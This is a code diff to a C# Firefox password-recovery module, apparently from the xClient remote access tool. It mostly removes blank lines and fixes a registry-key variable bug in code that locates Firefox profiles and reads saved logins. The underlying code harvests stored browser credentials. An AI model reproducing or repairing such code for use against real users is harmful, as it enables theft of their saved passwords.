@@ -26,7 +26,6 @@ namespace xClient.Core.Recovery.Browsers
 
         static Firefox()
         {
-
             try
             {
                 firefoxPath = GetFirefoxInstallPath();
@@ -58,7 +57,6 @@ namespace xClient.Core.Recovery.Browsers
         /// <returns>List of Username/Password/Host</returns>
         public static List<RecoveredAccount> GetSavedPasswords()
         {
-
             List<RecoveredAccount> firefoxPasswords = new List<RecoveredAccount>();
             try
             {
@@ -84,7 +82,6 @@ namespace xClient.Core.Recovery.Browsers
             }
             catch (Exception)
             {
-
             }
             return firefoxPasswords;
         }
@@ -181,7 +178,6 @@ namespace xClient.Core.Recovery.Browsers
 
             // return first profile, fuck it.
             return profiles[0];
-
         }
         private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
         {
@@ -190,8 +186,6 @@ namespace xClient.Core.Recovery.Browsers
                 return file;
             }
             throw new Exception("No Firefox logins.json was found");
-
-
         }
         private static DirectoryInfo GetFirefoxInstallPath()
         {
@@ -218,17 +212,15 @@ namespace xClient.Core.Recovery.Browsers
                     throw new NullReferenceException("Install string was null");
 
                 firefoxPath = new DirectoryInfo(installString);
-
-
             }
             else if (localMachine2 != null)
             {
-                string[] installedVersions = localMachine1.GetSubKeyNames();
+                string[] installedVersions = localMachine2.GetSubKeyNames();
                 // we'll take the first installed version, people normally only have one
                 if (installedVersions.Length == 0)
                     throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
 
-                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);
+                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);
 
                 // get install directory
                 string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
